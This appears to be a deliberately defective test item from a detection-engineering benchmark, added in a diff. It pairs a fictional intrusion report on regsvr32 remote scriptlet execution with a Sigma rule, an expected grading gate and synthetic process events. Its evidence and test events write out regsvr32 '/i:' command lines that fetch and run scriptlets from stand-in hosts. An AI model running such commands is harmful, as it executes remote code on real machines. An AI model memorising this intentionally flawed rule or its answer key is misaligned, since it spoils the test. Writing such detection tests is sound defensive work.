@@ -1,0 +1,121 @@
+id: D4-04
+role: defective
+defect_class: D4
+evasive: true
+why: The value scrobj.dll is not in the evidence quotation (the cited command line is truncated before
+  it) and is not in the covers of the declared assumption. The assumption's prose mentions scrobj.dll,
+  but its covers list contains only '/i:http://', so the contract's covers test is not met for scrobj.dll.
+  The other values are supported by the quotation or by the covers list.
+expected_gate: G4
+report_text: Telemetry from the Ironpine intrusion shows the actor using regsvr32.exe as a proxy to run
+  remote script content on engineering workstations. The binary was started by a short-lived command shell
+  and pointed at a scriptlet hosted on sync.cranemail.test. Because the process audit record was truncated,
+  responders could only reconstruct the leading part of the call as regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct,
+  which loads the remote file without registering anything on disk. The scriptlet in turn launched a staged
+  loader from the user's temporary directory. Since the request goes out over HTTPS from a signed Windows
+  binary, perimeter controls did not flag it. Our recommendation is a process-creation detection that
+  keys on the remote scriptlet being passed on the command line, as the technique leaves little other
+  trace on the host.
+evidence:
+- regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct
+- pointed at a scriptlet hosted on sync.cranemail.test
+logsource: windows_process_creation
+techniques:
+- T1218.010
+sigma_yaml: |
+  title: Regsvr32 Remote Scriptlet Execution
+  id: e05a7b31-6d84-4a29-9c17-2f3b8e4d1a56
+  status: experimental
+  description: Detects regsvr32.exe loading a remote scriptlet through the /i switch together with the script component runtime.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.010
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith: '\regsvr32.exe'
+    selection_url:
+      CommandLine|contains:
+        - '/i:https://'
+        - '/i:http://'
+    selection_dll:
+      CommandLine|contains: 'scrobj.dll'
+    condition: selection_img and selection_url and selection_dll
+  falsepositives:
+    - Software installers registering components from a network share
+  level: high
+assumptions:
+- statement: The loader may also be staged over plain HTTP on alternate hosts, and it is paired with the
+    standard script component runtime library scrobj.dll.
+  justification: Scriptlet loaders of this kind are routinely hosted on plain HTTP infrastructure; the
+    report documents only an HTTPS instance.
+  covers:
+  - /i:http://
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32 /s /n /u /i:http://198.51.100.23/cdn/a.sct scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig.exe /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\net.exe
+    cmd: net.exe user
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /s C:\LabCodec\codec.dll
+    parent: C:\Windows\System32\msiexec.exe
+    parent_cmd: msiexec.exe /i codec.msi
+    user: LAB\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\regsvr32.exe
+    cmd: regsvr32.exe /u /s scrobj.dll
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c hardening.bat
+    user: LAB\secops
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
